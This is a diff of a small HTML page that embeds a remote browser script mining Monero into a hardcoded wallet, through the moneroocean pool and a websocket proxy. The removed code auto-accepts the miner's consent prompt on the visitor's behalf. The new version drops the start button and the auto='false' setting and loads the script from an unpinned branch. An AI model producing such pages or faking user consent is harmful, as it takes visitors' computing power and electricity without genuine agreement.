@@ -4,82 +4,45 @@
   <meta charset="utf-8">
   <title>Monero RandomX Miner</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body { font-family: sans-serif; max-width: 600px; margin: 40px auto; padding: 0 16px; }
-    #status { margin-top: 20px; padding: 12px; background: #f0f0f0; border-radius: 8px; }
-    button { font-size: 18px; padding: 12px 24px; cursor: pointer; margin-top: 16px; }
-  </style>
 </head>
 <body>
   <h1>Mining Monero (RandomX)</h1>
   <p>Progress: <a href="https://moneroocean.stream" target="_blank">MoneroOcean</a></p>
+  <div id="log" style="background:#111;color:#0f0;padding:12px;font-family:monospace;white-space:pre-wrap;min-height:120px;"></div>
 
-  <button id="btnStart">▶ START MINING</button>
-  <div id="status">Menunggu klik START...</div>
+  <script>
+    const logEl = document.getElementById('log');
+    function log(msg) {
+      logEl.textContent += msg + '\n';
+      console.log(msg);
+    }
 
+    window.addEventListener('randomx:ready', (e) => {
+      log('✓ randomx:ready — miner siap');
+      const rx = e.detail.instance;
+      log('State: ' + JSON.stringify(rx.state));
+    });
+
+    window.addEventListener('randomx:error', (e) => {
+      log('✗ randomx:error → ' + JSON.stringify(e.detail));
+    });
+
+    // Tangkap error JS biasa
+    window.onerror = function(msg, url, line) {
+      log('JS Error: ' + msg + ' @' + line);
+    };
+  </script>
+
+  <!-- Embed default (bukan headless) -->
   <script defer crossorigin="anonymous"
-    src="https://cdn.jsdelivr.net/gh/aa022/RandomX-bonanza@ababefb18fd35142547fc1e906efd8558a3c12e9/dist/embed.js"
+    src="https://cdn.jsdelivr.net/gh/aa022/RandomX-bonanza@main/dist/embed.js"
     data-wallet="85KNrXfutegLDjeRiaBjkUVjCU2A3jkDq8s79A6M1dXg3dL4zZcNwh9UZkSL2HrGmZhoVuFru53mQH8MMz97nTzc47kk9kr"
     data-pool="gulf.moneroocean.stream"
     data-port="10128"
     data-proxy="wss://gxmail.dev"
     data-mode="light"
-    data-workload="40"
-    data-worker-name="web1"
-    data-headless="true"
-    data-auto="false">
-  </script>
-
-  <script>
-    const statusEl = document.getElementById('status');
-    const btn = document.getElementById('btnStart');
-    let rx = null;
-
-    function log(msg) {
-      statusEl.textContent = msg;
-      console.log(msg);
-    }
-
-    // Tunggu embed siap
-    window.addEventListener('randomx:ready', (e) => {
-      rx = e.detail.instance;
-      log('Miner siap. Klik tombol START MINING.');
-    });
-
-    window.addEventListener('randomx:error', (e) => {
-      log('Error: ' + (e.detail?.message || JSON.stringify(e.detail)));
-    });
-
-    btn.addEventListener('click', (ev) => {
-      if (!rx) {
-        log('Miner belum siap, tunggu sebentar...');
-        return;
-      }
-
-      log('Meminta consent & start...');
-
-      // Pakai event klik user (trusted) supaya consent diterima
-      const ok = rx.start(ev);
-      if (ok) {
-        log('Mining dimulai...');
-      } else {
-        // Fallback: request consent dulu
-        rx.requestConsent(ev);
-        rx.on('consent-request', (detail) => {
-          detail.accept();
-          log('Consent diterima, mining jalan...');
-        });
-      }
-    });
-
-    // Update status hashrate
-    setInterval(() => {
-      if (!rx) return;
-      const s = rx.state;
-      if (s && s.running) {
-        log(`Mining... ${s.hashrate || 0} H/s | phase: ${s.phase} | accepted: ${s.accepted || 0}`);
-      }
-    }, 2000);
+    data-workload="30"
+    data-worker-name="web1">
   </script>
 </body>
 </html>
